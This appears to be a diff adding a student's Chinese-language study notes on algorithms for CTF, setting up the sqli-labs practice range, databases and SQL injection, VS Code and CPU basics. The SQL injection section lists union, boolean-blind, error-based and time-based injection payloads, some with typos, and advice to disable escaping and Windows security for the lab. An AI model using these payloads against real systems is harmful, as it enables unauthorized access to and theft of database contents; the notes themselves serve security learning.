+      <tr>
+          <td style="text-align: left"><strong>图</strong></td>
+          <td style="text-align: left">一张地图（网络）。节点和连线。</td>
+          <td style="text-align: left">表示实体之间的复杂关系。</td>
+          <td style="text-align: left"><strong>CTF/安全场景</strong>：社交网络分析（找攻击者关联）、网络拓扑分析（找关键节点）、推荐系统。</td>
+      </tr>
+  </tbody>
+</table>
+<hr>
+<h2 id="第二部分核心算法策略你的兵法">
+<a class="header-anchor" href="#%e7%ac%ac%e4%ba%8c%e9%83%a8%e5%88%86%e6%a0%b8%e5%bf%83%e7%ae%97%e6%b3%95%e7%ad%96%e7%95%a5%e4%bd%a0%e7%9a%84%e5%85%b5%e6%b3%95"></a>
+第二部分：核心算法策略——你的“兵法”
+</h2><p>这是你作为“战略师”的核心。当你面对一个具体的、复杂的问题时，你需要调用这部分知识来制定作战计划。</p>
+<h3 id="1-我需要在数据中查找什么">
+<a class="header-anchor" href="#1-%e6%88%91%e9%9c%80%e8%a6%81%e5%9c%a8%e6%95%b0%e6%8d%ae%e4%b8%ad%e6%9f%a5%e6%89%be%e4%bb%80%e4%b9%88"></a>
+1. 我需要在数据中查找什么？
+</h3><ul>
+<li><strong>场景</strong>：给你一个有序的列表（比如排好序的IP黑名单），快速找到某个IP在不在里面。</li>
+<li><strong>战略</strong>：<strong>查找策略</strong>。</li>
+<li><strong>工具包</strong>：
+<ul>
+<li><strong>二分查找</strong>：数据是有序的，就用它。效率极高。<strong>（必知）</strong></li>
+<li><strong>深度优先搜索（DFS）</strong>：一条道走到黑。适合“是否存在一条路径”、“遍历所有可能性”（如走迷宫）。<strong>（必知）</strong></li>
+<li><strong>广度优先搜索（BFS）</strong>：层层递进。适合找“最短路径”、“最少步骤”。<strong>（必知）</strong></li>
+</ul>
+</li>
+</ul>
+<h3 id="2-我需要把一堆东西安排得明明白白">
+<a class="header-anchor" href="#2-%e6%88%91%e9%9c%80%e8%a6%81%e6%8a%8a%e4%b8%80%e5%a0%86%e4%b8%9c%e8%a5%bf%e5%ae%89%e6%8e%92%e5%be%97%e6%98%8e%e6%98%8e%e7%99%bd%e7%99%bd"></a>
+2. 我需要把一堆东西安排得明明白白？
+</h3><ul>
+<li><strong>场景</strong>：CPU处理任务、物流规划、比赛日程安排。</li>
+<li><strong>战略</strong>：<strong>排序与调度策略</strong>。</li>
+<li><strong>工具包</strong>：
+<ul>
+<li><strong>各种排序（快排、归并、堆排）</strong>：<strong>你不需要会手写，但必须知道</strong>：快排是通用的，归并排序适合处理超大数据（外部排序），堆排序适合在数据流中动态找最大/最小。在CTF逆向中，识别出用了什么排序算法能帮你理解程序逻辑。</li>
+<li><strong>拓扑排序</strong>：当事情有依赖关系时（A必须先于B完成），用它排出执行顺序。比如编译依赖、课程安排。<strong>（推荐了解）</strong></li>
+</ul>
+</li>
+</ul>
+<h3 id="3-在资源有限的情况下如何达到最好或最省">
+<a class="header-anchor" href="#3-%e5%9c%a8%e8%b5%84%e6%ba%90%e6%9c%89%e9%99%90%e7%9a%84%e6%83%85%e5%86%b5%e4%b8%8b%e5%a6%82%e4%bd%95%e8%be%be%e5%88%b0%e6%9c%80%e5%a5%bd%e6%88%96%e6%9c%80%e7%9c%81"></a>
+3. 在资源有限的情况下，如何达到最好（或最省）？
+</h3><ul>
+<li><strong>场景</strong>：网络流量最小化、地图导航、布线成本最低。</li>
+<li><strong>战略</strong>：<strong>图论与优化策略</strong>。这是算法中最有价值的部分之一。</li>
+<li><strong>工具包</strong>：
+<ul>
+<li><strong>最短路径（Dijkstra、Floyd）</strong>：地图导航。<strong>Dijkstra</strong>是“从一个点到其他所有点的最短路径”（无负权）。<strong>（必知）</strong> 在网络攻防中，模拟攻击路径时这就是核心模型。</li>
+<li><strong>最小生成树（Prim、Kruskal）</strong>：如何用最低成本（比如最少的电缆）把所有点连接起来。设计网络布线、管道铺设。<strong>（推荐了解）</strong></li>
+<li><strong>动态规划（DP）</strong>：这是最难也是最强大的。核心思想是**“大事化小，记住结果”<strong>。适合求“最值”问题（最多、最少、最长），且问题能拆分成重叠的子问题。比如：背包问题（资源有限下装价值最高的东西）、最长公共子序列（对比文件差异，就是diff工具的原理）。</strong>（理解其思想即可，不建议死磕难题）**</li>
+</ul>
+</li>
+</ul>
+<h3 id="4-数据挖掘与模式发现ai安全的交叉领域">
+<a class="header-anchor" href="#4-%e6%95%b0%e6%8d%ae%e6%8c%96%e6%8e%98%e4%b8%8e%e6%a8%a1%e5%bc%8f%e5%8f%91%e7%8e%b0ai%e5%ae%89%e5%85%a8%e7%9a%84%e4%ba%a4%e5%8f%89%e9%a2%86%e5%9f%9f"></a>
+4. 数据挖掘与模式发现（AI/安全的交叉领域）
+</h3><ul>
+<li><strong>场景</strong>：从海量日志中发现攻击模式、对用户进行分群、做推荐系统。</li>
+<li><strong>战略</strong>：<strong>统计与机器学习策略</strong>。</li>
+<li><strong>工具包</strong>：
+<ul>
+<li><strong>分类（KNN、决策树、SVM）</strong>：把新东西归类。比如，根据邮件特征判断它是垃圾邮件还是正常邮件。<strong>（了解应用场景）</strong></li>
+<li><strong>聚类（K-Means）</strong>：把一堆东西自动分成几堆。比如，在流量日志中，自动把相似的攻击行为聚成一类，发现未知攻击。<strong>（了解应用场景）</strong></li>
+<li><strong>关联规则（Apriori）</strong>：发现“买了A的人也常买B”这种规律。<strong>（了解应用场景）</strong></li>
+<li><strong>PageRank</strong>：给网页排名。核心思想是被越多高质量页面引用，自己质量就越高。这是搜索引擎的基石，也适用于社交网络影响力分析。<strong>（了解思想）</strong></li>
+</ul>
+</li>
+</ul>
+<hr>
+<h2 id="第三部分ctf网络安全领域的专项战略地图">
+<a class="header-anchor" href="#%e7%ac%ac%e4%b8%89%e9%83%a8%e5%88%86ctf%e7%bd%91%e7%bb%9c%e5%ae%89%e5%85%a8%e9%a2%86%e5%9f%9f%e7%9a%84%e4%b8%93%e9%a1%b9%e6%88%98%e7%95%a5%e5%9c%b0%e5%9b%be"></a>
+第三部分：CTF/网络安全领域的“专项战略地图”
+</h2><p>把上面的通用兵法，具体落到你的主战场上，你的“规划”会是这样的：</p>
+<table>
+  <thead>
+      <tr>
+          <th style="text-align: left">在CTF中遇到的情况</th>
+          <th style="text-align: left">问题的本质（需要识别）</th>
+          <th style="text-align: left">可以用的算法策略（规划）</th>
+          <th style="text-align: left">执行（AI来写）</th>
+      </tr>
+  </thead>
+  <tbody>
+      <tr>
+          <td style="text-align: left"><strong>逆向工程</strong>：拿到一个程序，看到它用了某种排序或查找。</td>
+          <td style="text-align: left">这是一个<strong>已知的算法模式</strong>。</td>
+          <td style="text-align: left">“它这里用了<strong>快速排序</strong>，这里是<strong>二分查找</strong>。我可以让AI生成对应算法的特征代码，帮我在内存中快速定位关键数据。”</td>
+          <td style="text-align: left">AI生成快速排序/二分查找的示例代码。</td>
+      </tr>
+      <tr>
+          <td style="text-align: left"><strong>Pwn / 二进制</strong>：需要泄露内存地址，绕过ASLR(地址空间布局随机化)。</td>
+          <td style="text-align: left">需要<strong>暴力枚举</strong>或<strong>部分覆盖</strong>。</td>
+          <td style="text-align: left">“需要用<strong>贪心策略</strong>，先泄露一个字节，根据反馈再泄露下一个。这本质上是一种按位的<strong>深度优先搜索</strong>。”</td>
+          <td style="text-align: left">AI写一个自动化的、按位爆破的脚本框架。</td>
+      </tr>
+      <tr>
+          <td style="text-align: left"><strong>Web安全</strong>：发现一个接口有逻辑漏洞，可以无限次重放请求。</td>
+          <td style="text-align: left">这是一个<strong>有限资源下的最优解问题</strong>。</td>
+          <td style="text-align: left">“需要在被WAF封IP之前，用最快的速度遍历所有可能的ID。这是一个典型的<strong>广度优先搜索</strong>（BFS）任务，我需要把待测ID放进队列，开启多线程。”</td>
+          <td style="text-align: left">AI写一个支持多线程、队列管理的并发请求脚本。</td>
+      </tr>
+      <tr>
+          <td style="text-align: left"><strong>密码学</strong>：遇到一个加密算法，需要逆向破解。</td>
+          <td style="text-align: left">这是一个<strong>数学函数/映射</strong>问题。</td>
+          <td style="text-align: left">“算法看起来用了<strong>模幂运算</strong>，核心是<strong>欧几里得算法</strong>求逆元。我让AI用数学库实现一下这个大数运算。”</td>
+          <td style="text-align: left">AI调用Python的gmpy2库，实现扩展欧几里得算法。</td>
+      </tr>
+      <tr>
+          <td style="text-align: left"><strong>流量分析</strong>：拿到海量的PCAP包。</td>
+          <td style="text-align: left">这是<strong>数据挖掘/模式识别</strong>问题。</td>
+          <td style="text-align: left">“要用<strong>聚类算法</strong>把相似的流量会话分到一起，找出异常的、偏离正常簇的那一个。然后用<strong>关联规则</strong>分析它在和哪些异常IP通信。”</td>
+          <td style="text-align: left">AI调用Sklearn库，写一个K-Means聚类分析的脚本。</td>
+      </tr>
+  </tbody>
+</table>
+<h2 id="总结">
+<a class="header-anchor" href="#%e6%80%bb%e7%bb%93"></a>
+总结：
+</h2><ol>
+<li>
+<ul>
+<li><strong>数据结构</strong>：数组、链表、栈、队列、哈希表、树、图。</li>
+<li><strong>算法思想</strong>：<strong>二分查找、DFS、BFS、Dijkstra（最短路径）、排序（快排、归并）、动态规划（基本思想）。</strong></li>
+</ul>
+</li>
+<li>
+<ul>
+<li><strong>其他图算法</strong>：最小生成树、拓扑排序、最大流。</li>
+<li><strong>经典模型</strong>：生产者-消费者问题（队列）、背包问题（DP）。</li>
+<li><strong>机器学习基础</strong>：分类、聚类、回归是干什么的。</li>
+</ul>
+<p><img src="C:%5CUsers%5C34059%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20260306184313161.png" alt="image-20260306184313161"></p>
+</li>
+</ol>
+<h2 id="处理phpstudy遇到的问题">
+<a class="header-anchor" href="#%e5%a4%84%e7%90%86phpstudy%e9%81%87%e5%88%b0%e7%9a%84%e9%97%ae%e9%a2%98"></a>
+<strong>处理phpstudy遇到的问题</strong>
+</h2><p><strong>修改数据库名字，配置网站域名和php版本</strong></p>
+<p><strong>首先就是网站建立时的版本，越低越好</strong></p>
+<p><strong>其次在建立网站时要找好路径，比如路径在WWW的话，域名为localhost，那我想要进入靶场网站，直接输入https://localhost.sqli-labs-master就可以了</strong></p>
+<p><strong>再者就是需要修改PHP的默认密码</strong></p>
+<p><strong>D:\phpstudy_pro\WWW\sqli-labs-master\sql-connections\db-creds.inc</strong></p>
+<pre tabindex="0"><code>$dbpass = &#39;新密码&#39;
+</code></pre><p><strong>在这个文件中修改即可，修改后就修改了默认密码这样就可以直接连接数据库，否则无法直接连接，PHP也无法工作</strong></p>
+<p><strong>建立在网站上的语言有后端语言PHP,Rudy,JavaScript,Java,ASP.NET,Python等，攻击者利用相应的后端语言编写木马种在网站文件系统当中</strong></p>
+<p><strong>数据库实际上并不是完全意义上的仓库，而是一套数据管理系统，而库需要自己创建就像在文件夹里创建文件，在数据库里按照mysql的规定创建表和填写数据</strong></p>
+<p><strong>FTP用来传文件</strong></p>
+<h3 id="第一步在公司电脑上开启-ftp-服务">
+<a class="header-anchor" href="#%e7%ac%ac%e4%b8%80%e6%ad%a5%e5%9c%a8%e5%85%ac%e5%8f%b8%e7%94%b5%e8%84%91%e4%b8%8a%e5%bc%80%e5%90%af-ftp-%e6%9c%8d%e5%8a%a1"></a>
+第一步：在公司电脑上开启 FTP 服务
+</h3><p>小王在你的公司电脑上安装并启动 <strong>FTP 服务器软件</strong>（比如 FileZilla Server），然后设置：</p>
+<ul>
+<li>用户名：<code>you</code></li>
+<li>密码：<code>123456</code></li>
+<li>共享的文件夹：<code>D：\工作\</code></li>
+<li>端口：默认 <code>21</code></li>
+</ul>
+<p>📌 这一步叫<strong>搭建 FTP 服务</strong> 。</p>
+<hr>
+<h3 id="第二步你在家用-ftp-客户端连接">
+<a class="header-anchor" href="#%e7%ac%ac%e4%ba%8c%e6%ad%a5%e4%bd%a0%e5%9c%a8%e5%ae%b6%e7%94%a8-ftp-%e5%ae%a2%e6%88%b7%e7%ab%af%e8%bf%9e%e6%8e%a5"></a>
+第二步：你在家用 FTP 客户端连接
+</h3><p>你在家打开 <strong>FileZilla Client</strong>（免费软件），输入：</p>
+<ul>
+<li>主机：公司电脑的公网 IP（比如 <code>218.107.12.34</code>）</li>
+<li>用户名：<code>you</code></li>
+<li>密码：<code>123456</code></li>
+<li>端口：<code>21</code></li>
+</ul>
+<p>点击“快速连接”，几秒钟后，你就能看到：</p>
+<ul>
+<li>左边：你家的本地文件</li>
+<li>右边：公司电脑的 <code>D：\工作\</code> 文件夹</li>
+</ul>
+<p>📌 这就是 <strong>FTP 客户端连接服务器</strong> 。</p>
+<p><strong>web端口80，数据库服务端口3306，FTP21</strong></p>
+<p><strong><code>magic_quotes_gpc = Off</code></strong>
+<strong>位置在 <code>php.ini</code> 文件里。</strong></p>
+<p><strong>D:\phpstudy_pro\Extensions\php\php-5.2.17\php.ini</strong></p>
+<p><strong>改为magic_quotes_gpc = Off，否则测试注入会被转义，改后才能破坏语法结构，达到注入的效果</strong></p>
+<p><strong>一定要关闭Windows的安全设置</strong></p>
+<h2 id="数据库">
+<a class="header-anchor" href="#%e6%95%b0%e6%8d%ae%e5%ba%93"></a>
+数据库
+</h2><table>
+  <thead>
+      <tr>
+          <th style="text-align: center">表名</th>
+          <th style="text-align: center">主要作用</th>
+          <th style="text-align: center">在 SQL 注入中的核心用途</th>
+      </tr>
+  </thead>
+  <tbody>
+      <tr>
+          <td style="text-align: center"><strong>1. SCHEMATA 表</strong></td>
+          <td style="text-align: center">提供 MySQL 实例中<strong>所有数据库名</strong>的信息。</td>
+          <td style="text-align: center">用于获取目标服务器上<strong>所有数据库的名称</strong>，相当于执行 <code>show databases</code> 命令。</td>
+      </tr>
+      <tr>
+          <td style="text-align: center"><strong>2. TABLES 表</strong></td>
+          <td style="text-align: center">提供数据库中<strong>所有表名</strong>的信息。</td>
+          <td style="text-align: center">在知道数据库名后，用于获取该数据库下<strong>所有数据表的名称</strong>。</td>
+      </tr>
+      <tr>
+          <td style="text-align: center"><strong>3. COLUMNS 表</strong></td>
+          <td style="text-align: center">提供表中<strong>所有列名</strong>的详细信息。</td>
+          <td style="text-align: center">在知道表名后，用于获取该表中<strong>所有字段（列）的名称</strong>，为后续提取数据做准备。</td>
+      </tr>
+  </tbody>
+</table>
+<ol>
+<li>
+<p><strong>先查 <code>SCHEMATA</code></strong>：获取所有数据库名，找到可能存放敏感信息的库（如 <code>users</code>、<code>admin</code>）。</p>
+</li>
+<li>
+<p><strong>再查 <code>TABLES</code></strong>：根据库名，获取该库下所有的表名，找到关键表（如 <code>user</code>、<code>admin</code>）。</p>
+</li>
+<li>
+<p><strong>最后查 <code>COLUMNS</code></strong>：根据库名和表名，获取该表中所有的列名，找到关键字段（如 <code>username</code>、<code>password</code>）。</p>
+<p><strong>sql：CURD：增删改查</strong></p>
+<pre tabindex="0"><code>C = Create  (增) → 插入数据
+U = Update  (改) → 修改数据  
+R = Read    (查) → 查询数据
+D = Delete  (删) → 删除数据
+</code></pre></li>
+</ol>
+<p><strong>关系型数据库：Mysql(开源易学),Oracle(公司大厂),PostgreSQL(开源天花板),SQL Sever,SQLite(各种表，管理系统，数据分析，金融)</strong></p>
+<p><strong>非关系型数据库(NOSQL)：KV数据库(键值数据库)：Redis,memcrched,etcd,LEVELDB,rocksDB(键值对组成xxx：xxx)</strong></p>
+<p><strong>文档数据库：mongoDB(也是xxx：xxx，json形式但可自由添加，不用向关系数据库一样改表格，内容管理，博客，电商商品详情页)</strong></p>
+<ul>
+<li>
+<p><strong>存储：数据在硬盘上，是以扩展名为<code>.bson</code>的文件格式存在的。这是二进制格式，机器读写飞快，但你用记事本打开就会是一堆乱码。</strong></p>
+</li>
+<li>
+<p><strong>导入/导出：当你用<code>mongoexport</code>命令把数据从数据库里导出来时，它可以生成一个<code>.json</code>文件，方便你在其他系统里使用或用文本编辑器打开查看</strong></p>
+</li>
+<li>
+<h4 id="一搜索引擎数据库">
+<a class="header-anchor" href="#%e4%b8%80%e6%90%9c%e7%b4%a2%e5%bc%95%e6%93%8e%e6%95%b0%e6%8d%ae%e5%ba%93"></a>
+一、搜索引擎数据库
+</h4><ul>
+<li><strong>核心功能</strong>：提供强大的全文搜索能力，支持相关性排序，能快速、精确地找到信息。</li>
+<li><strong>代表产品</strong>：<strong>Elasticsearch</strong>、<strong>Apache Solr</strong>。</li>
+</ul>
+<h4 id="二向量数据库">
+<a class="header-anchor" href="#%e4%ba%8c%e5%90%91%e9%87%8f%e6%95%b0%e6%8d%ae%e5%ba%93"></a>
+二、向量数据库
+</h4><ul>
+<li><strong>核心功能</strong>：存储和索引多维向量，通过计算向量间的相似度来进行高效查询。</li>
+<li><strong>主要应用</strong>：
+<ul>
+<li><strong>人工智能</strong>：人脸识别、语义搜索、AI知识库（如大模型的长期记忆）。</li>
+<li><strong>推荐系统</strong>：寻找与用户兴趣最相似的物品。</li>
+</ul>
+</li>
+</ul>
+<h4 id="三图数据库">
+<a class="header-anchor" href="#%e4%b8%89%e5%9b%be%e6%95%b0%e6%8d%ae%e5%ba%93"></a>
+三、图数据库
+</h4><ul>
+<li><strong>核心功能</strong>：以节点和边的形式存储数据，专门用于处理复杂的、深度的关系网络。</li>
+<li><strong>主要应用</strong>：社交网络关系分析、 fraud detection（欺诈检测）、知识图谱。</li>
+</ul>
+<h4 id="四时序数据库">
+<a class="header-anchor" href="#%e5%9b%9b%e6%97%b6%e5%ba%8f%e6%95%b0%e6%8d%ae%e5%ba%93"></a>
+四、时序数据库
+</h4><ul>
+<li><strong>核心功能</strong>：针对时间戳数据进行优化，擅长处理持续产生的高频写入和高压缩率数据。</li>
+<li><strong>主要应用</strong>：监控系统（如服务器CPU、内存使用率）、物联网传感器数据分析。</li>
+</ul>
+<h4 id="五内存数据库">
+<a class="header-anchor" href="#%e4%ba%94%e5%86%85%e5%ad%98%e6%95%b0%e6%8d%ae%e5%ba%93"></a>
+五、内存数据库
+</h4><ul>
+<li><strong>核心功能</strong>：将数据主要存储在内存（RAM）中，以实现极低延迟的数据读写。</li>
+<li><strong>主要应用</strong>：实时报表生成、数据仓库加速、商业智能（BI）分析、缓存系统。</li>
+</ul>
+<h4 id="六多模数据库">
+<a class="header-anchor" href="#%e5%85%ad%e5%a4%9a%e6%a8%a1%e6%95%b0%e6%8d%ae%e5%ba%93"></a>
+六、多模数据库
+</h4><ul>
+<li><strong>核心功能</strong>：一个数据库引擎同时支持多种数据模型，无需部署多个数据库系统。</li>
+<li><strong>支持类型</strong>：可以同时处理<strong>键值对、图形、文档、关系型</strong>等多种数据结构。</li>
+</ul>
+<h4 id="七总结多边形的战士">
+<a class="header-anchor" href="#%e4%b8%83%e6%80%bb%e7%bb%93%e5%a4%9a%e8%be%b9%e5%bd%a2%e7%9a%84%e6%88%98%e5%a3%ab"></a>
+七、总结：多边形的战士
+</h4><ul>
+<li><strong>核心理念</strong>：没有一个单一的数据库能解决所有问题。一个成熟的、复杂的项目，往往是由上述<strong>多种不同类型的数据库结合而成</strong>的。它们各司其职，共同构建出功能完善、性能强大的应用系统，就像一个拥有多种能力的“多边形战士”。</li>
+</ul>
+</li>
+</ul>
+<p>select   &lsquo;id=dashabi&rsquo; or 1=1&rsquo;from  information_schema  where  table_name=security  and   select   &lsquo;vsgavcuhysvas&rsquo;  or &lsquo;1&rsquo;=&lsquo;1&rsquo; &ndash;  from   表   在某个数据库</p>
+<p>?id=1&rsquo; and &lsquo;1&rsquo;=&lsquo;2</p>
+<p>?id=1 and 1=2</p>
+<p>?id=root&rsquo;  &ndash;+</p>
+<p>&ndash;      #</p>
+<h2 id="sql注入">
+<a class="header-anchor" href="#sql%e6%b3%a8%e5%85%a5"></a>
+SQL注入
+</h2><h3 id="第一步信息收集">
+<a class="header-anchor" href="#%e7%ac%ac%e4%b8%80%e6%ad%a5%e4%bf%a1%e6%81%af%e6%94%b6%e9%9b%86"></a>
+第一步：信息收集
+</h3><p>在不知道目标内部结构的情况下，你首先要通过查询 <strong><code>information_schema</code></strong> 这个“数据库的数据库”，把目标的内部结构摸清楚。</p>
+<p><strong>信息收集要回答三个问题：</strong></p>
+<pre><code>  1. **有哪些库？** → 查询 `SCHEMATA` 表
+</code></pre>
+<ol start="2">
+<li>
+<p><strong>有哪些表？</strong> → 查询 <code>TABLES</code> 表</p>
+</li>
+<li>
+<p><strong>有哪些列？</strong> → 查询 <code>COLUMNS</code> 表</p>
+</li>
+</ol>
+<h2 id="2注入">
+<a class="header-anchor" href="#2%e6%b3%a8%e5%85%a5"></a>
+2：注入
+</h2><p>SQL注入实际就是在URL里面写东西但却被操作系统当作指令运行从而越权实现了数据库的增删改查</p>
+<p>防御SQL注入是一个纵深防御分为：</p>
+<p>代码层：参数化查询把URL里的输入当普通字符，给特殊字符加反斜杠转义失去特殊意义，过滤掉不符合输入预期的输入</p>
+<p>应用层：使用安全框架，框架内置了参数化查询，定期更新安装补丁，最小权限原则</p>
+<p>select1，2，3是获取每个表有多少列，哪个显示位可以操作然后用来获取信息</p>
+<p>order by 获得的是至少每个表有多少列</p>
+<p>然后获取显示位，对显示位操作获取所有表名，接着查对应表名的列名，接着是用户信息</p>
+<p>select1，2，3实际上在数据库创建了三个空间，属于自己的表，并且与最少的列对应</p>
+<p>找出显示位在对应空间进行操作获取表名，列名，用户信息</p>
+<p>分开写，放一块写都行，要用groupconcat为了将多行信息放到一行不然显示不全</p>
+<h4 id="报错注入联合注入布尔盲注时间盲注">
+<a class="header-anchor" href="#%e6%8a%a5%e9%94%99%e6%b3%a8%e5%85%a5%e8%81%94%e5%90%88%e6%b3%a8%e5%85%a5%e5%b8%83%e5%b0%94%e7%9b%b2%e6%b3%a8%e6%97%b6%e9%97%b4%e7%9b%b2%e6%b3%a8"></a>
+报错注入，联合注入，布尔盲注，时间盲注
+</h4><p>1，先判断又没有注入,测试注入，用?id=1   ?id=1&rsquo;   ?id=1 and1=2  ?id=1&rsquo; and'1&rsquo;=&lsquo;1   ?id=1&rsquo; and sleep(5)   (有卡顿)这些方法判断，如果所有都显示正常信息，并且没有卡顿则没有SQL注入</p>
+<p>2，先试试联合注入，如果页面显示数据则用联合注入?id=-1&rsquo; union select 1,2,3&ndash;+</p>
+<p>如果页面只分显示和不显示，则用布尔盲注  ?id=1&rsquo; and ascli(substr(database(),1,1))&gt;100 &ndash;+</p>
+<p>如果页面报错，则用报错注入?id=1&rsquo; and updatexml(1,concat(0x7e,database(),0x7e),1)</p>
+<p>如果页面没有任何变化，用时间盲注?id=1&rsquo; and if(length(database())=8,seelp(3),1)</p>
+<p>database()	当前数据库名</p>
+<p>user()	当前用户名</p>
+<p>version()	数据库版本</p>
+<p>table_name	表名</p>
+<p>column_name	字段名</p>
+<p>data	数据</p>
+<p>information_schema	数据库的&quot;数据库&quot;(台帐本)</p>
+<p>information_schema.tables	所有表的信息</p>
+<p>information_schema.columns	所有字段的信息</p>
+<p>group_concat()	把多行拼成一行</p>
+<p>concat()	把多列拼成一列</p>
+<p>table_name   数据库名</p>
+<p>table_name=database()    数据库名等于当前数据库名</p>
+<p>group_concat(table_name) from information_schema.tables where table_schema=database()</p>
+<h2 id="vscode代码视角">
+<a class="header-anchor" href="#vscode%e4%bb%a3%e7%a0%81%e8%a7%86%e8%a7%92"></a>
+VScode/代码视角
+</h2><p><strong>编译器gcc xxx.c -o xxx.exe</strong></p>
+<p><strong>./xxx.exe</strong></p>
+<p><strong>如果不想手动调用可以vscode配置json</strong></p>
+<p>task.json自动帮你调用编译器,默认终端</p>
+<p>.json是一种数据格式{变量名：变量值}</p>
+<p><code>{</code>
+<code>&quot;version&quot;: &quot;2.0.0&quot;,</code>
+<code>&quot;tasks&quot;: [</code>
+<code>{</code>
+<code>&quot;label&quot;: &quot;Build and Run C&quot;,  </code>&ldquo;type&rdquo;: &ldquo;shell&rdquo;,<code> </code>&ldquo;command&rdquo;: &ldquo;gcc&rdquo;,      <br>
+<code>&quot;args&quot;: [</code>
+<code>&quot;${file}&quot;,                </code>&quot;-o&quot;,                 <br>
+<code>&quot;${fileDirname}/${fileBasenameNoExtension}.exe&quot;,  </code>&quot;&amp;&amp;&quot;,                    <br>
+<code>&quot;${fileDirname}/${fileBasenameNoExtension}.exe&quot;  </code>],<code> </code>&ldquo;group&rdquo;: {<code> </code>&ldquo;kind&rdquo;: &ldquo;build&rdquo;,<code> </code>&ldquo;isDefault&rdquo;: true      <br>
+<code>},</code>
+<code>&quot;presentation&quot;: {</code>
+<code>&quot;reveal&quot;: &quot;always&quot;          </code>}<code> </code>}<code> </code>]<code> </code>}`</p>
+<p>汇编语言</p>
+<p><strong>汇编语言存在的意义：</strong></p>
+<ol>
+<li><strong>必要的中介</strong>：人无法直接写二进制，但需要控制硬件</li>
+<li><strong>精确控制</strong>：在需要时能操控每个CPU细节</li>
+<li><strong>性能极致</strong>：手工优化能达到编译器做不到的效果</li>
+<li><strong>理解基础</strong>：学习汇编才能真正理解计算机</li>
+<li><strong>逆向工程</strong>：分析恶意软件、漏洞挖掘必须懂</li>
+<li><strong>系统开发</strong>：操作系统、驱动、嵌入式离不开</li>
+</ol>
+<table>
+  <thead>
+      <tr>
+          <th style="text-align: left">特性</th>
+          <th style="text-align: left">编译型</th>
+          <th style="text-align: left">解释型</th>
+          <th style="text-align: left">混合型</th>
+      </tr>
+  </thead>
+  <tbody>
+      <tr>
+          <td style="text-align: left"><strong>代表语言</strong></td>
+          <td style="text-align: left">C、C++、Go、Rust、Swift、Pascal、Fortran</td>
+          <td style="text-align: left">Python、JavaScript、PHP、Ruby、Perl、Bash</td>
+          <td style="text-align: left">Java、C#、Kotlin、Scala、Groovy</td>
+      </tr>
+      <tr>
+          <td style="text-align: left"><strong>执行速度</strong></td>
+          <td style="text-align: left">⚡ 极快</td>
+          <td style="text-align: left">🐢 较慢</td>
+          <td style="text-align: left">🚀 快</td>
+      </tr>
+      <tr>
+          <td style="text-align: left"><strong>开发速度</strong></td>
+          <td style="text-align: left">🐢 较慢</td>
+          <td style="text-align: left">⚡ 极快</td>
+          <td style="text-align: left">🚀 快</td>
+      </tr>
+      <tr>
+          <td style="text-align: left"><strong>跨平台性</strong></td>
+          <td style="text-align: left">❌ 差</td>
+          <td style="text-align: left">✅ 好</td>
+          <td style="text-align: left">✅ 好</td>
+      </tr>
+      <tr>
+          <td style="text-align: left"><strong>内存管理</strong></td>
+          <td style="text-align: left">手动</td>
+          <td style="text-align: left">自动</td>
+          <td style="text-align: left">自动</td>
+      </tr>
+      <tr>
+          <td style="text-align: left"><strong>学习曲线</strong></td>
+          <td style="text-align: left">陡峭</td>
+          <td style="text-align: left">平缓</td>
+          <td style="text-align: left">中等</td>
+      </tr>
+      <tr>
+          <td style="text-align: left"><strong>调试难度</strong></td>
+          <td style="text-align: left">难</td>
+          <td style="text-align: left">易</td>
+          <td style="text-align: left">中等</td>
+      </tr>
+      <tr>
+          <td style="text-align: left"><strong>典型应用</strong></td>
+          <td style="text-align: left">系统软件</td>
+          <td style="text-align: left">脚本工具</td>
+          <td style="text-align: left">企业应用</td>
+      </tr>
+  </tbody>
+</table>
+<table>
+  <thead>
+      <tr>
+          <th style="text-align: left">你要做什么</th>
+          <th style="text-align: left">用哪个面板</th>
+          <th style="text-align: left">为什么</th>
+      </tr>
+  </thead>
+  <tbody>
+      <tr>
+          <td style="text-align: left">手动编译C程序</td>
+          <td style="text-align: left"><strong>终端</strong></td>
+          <td style="text-align: left">要输入<code>gcc</code>命令</td>
+      </tr>
+      <tr>
+          <td style="text-align: left">运行程序</td>
+          <td style="text-align: left"><strong>终端</strong></td>
+          <td style="text-align: left">要看程序输出</td>
+      </tr>
+      <tr>
+          <td style="text-align: left">找代码Bug</td>
+          <td style="text-align: left"><strong>调试控制台</strong></td>
+          <td style="text-align: left">要看变量值、执行流程，F5</td>
+      </tr>
+      <tr>
+          <td style="text-align: left">看插件为什么报错</td>
+          <td style="text-align: left"><strong>输出</strong></td>
+          <td style="text-align: left">有详细日志</td>
+      </tr>
+      <tr>
+          <td style="text-align: left">运行网页服务</td>
+          <td style="text-align: left"><strong>端口</strong></td>
+          <td style="text-align: left">要管理网络端</td>
+      </tr>
+  </tbody>
+</table>
+<h2 id="源代码--编译汇编--机器码--加载到内存--cpu执行--结果写回">
+<a class="header-anchor" href="#%e6%ba%90%e4%bb%a3%e7%a0%81--%e7%bc%96%e8%af%91%e6%b1%87%e7%bc%96--%e6%9c%ba%e5%99%a8%e7%a0%81--%e5%8a%a0%e8%bd%bd%e5%88%b0%e5%86%85%e5%ad%98--cpu%e6%89%a7%e8%a1%8c--%e7%bb%93%e6%9e%9c%e5%86%99%e5%9b%9e"></a>
+源代码 → 编译/汇编 → 机器码 → 加载到内存 → CPU执行 → 结果写回
+</h2><p><strong>a+b</strong></p>
+<p><strong>① 从内存拿 a 到 CPU</strong>
+<strong>② 从内存拿 b 到 CPU                硬盘是档案室，内存是办公桌，寄存器是你正在做的事情</strong>
+<strong>③ CPU里算 a+b</strong>
+<strong>④ 把结果存回内存</strong></p>
+<p><strong>// 1. 安装游戏时</strong>
+<strong>[硬盘] 存着 10GB 游戏文件（永久）</strong></p>
+<p><strong>// 2. 双击启动游戏</strong>
+<strong>[硬盘] → 把核心代码 → [内存]（10GB→占用2GB）</strong>
+<strong>[内存] 现在有：游戏引擎、英雄数据、地图</strong></p>
+<p><strong>// 3. 开始对线（每秒发生几十万次）</strong>
+<strong>你按 Q 键：</strong>
+<strong>① 键盘输入 → CPU</strong>
+<strong>② CPU查寄存器：现在英雄状态</strong>
+<strong>③ 从内存读：技能数据</strong>
+<strong>④ CPU计算：伤害 = 攻击力 × 技能系数</strong>
+<strong>⑤ 结果存寄存器（临时）</strong>
+<strong>⑥ 同步到内存（给其他程序看）</strong>
+<strong>⑦ 画面数据 → 显卡 → 屏幕</strong></p>
